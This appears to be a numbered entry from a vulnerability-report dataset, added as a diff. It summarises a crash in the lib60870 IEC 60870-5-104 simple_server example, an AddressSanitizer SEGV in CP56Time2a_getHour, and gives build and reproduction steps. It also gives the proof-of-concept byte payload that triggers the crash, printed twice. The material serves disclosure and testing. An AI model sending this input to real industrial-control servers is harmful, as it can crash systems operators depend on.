@@ -1,0 +1,14 @@
+Number: 53
+
+Summarize:
+Against the latest source from /mz-automation/lib60870/ (exact release not stated), the lib60870-C/examples/cs104_server/simple_server example crashes on the supplied PoC input. The stack shows printCP56Time2a/clockSyncHandler calling src/iec60870/apl/cpXXtime2a.c:CP56Time2a_getHour, where the return statement reads self->encodedValue[3]; AddressSanitizer reports a SEGV on a READ from address 0x13 and the process aborts. The report shows the crash point at that read, but does not identify the precise earlier cause.
+
+Reproduce:
+1. Download the latest source from /mz-automation/lib60870/.
+2. Build with clang and AddressSanitizer by setting CFLAGS="-g -fsanitize=address" and LDFLAGS="-fsanitize=address" before make.
+3. Run the built lib60870-C/examples/cs104_server/simple_server example.
+4. Deliver the reporter's PoC byte sequence to the server (the report does not specify the exact client command): 681a 0f00 0000 0000 0000 0000 0000 0000 0083 00fa 0000 0083 00fa 00e2 680a 0000 0000 6700 06fa 00e2 eb00 8000 0000 0000 0100 0083 0004 83f0.
+5. Observe ASAN:DEADLYSIGNAL / ERROR: AddressSanitizer: SEGV on unknown address 0x000000000013 caused by a READ in CP56Time2a_getHour at src/iec60870/apl/cpXXtime2a.c:583, with the stack including printCP56Time2a in simple_server.c, then clockSyncHandler, and the process aborting.
+
+Payload:
+68 1a 0f 00 00 00 00 00 00 00 00 00 00 00 00 00 00 83 00 fa 00 00 00 83 00 fa 00 e2 68 0a 00 00 00 00 67 00 06 fa 00 e2 eb 00 80 00 00 00 00 00 01 00 00 83 00 04 83 f0
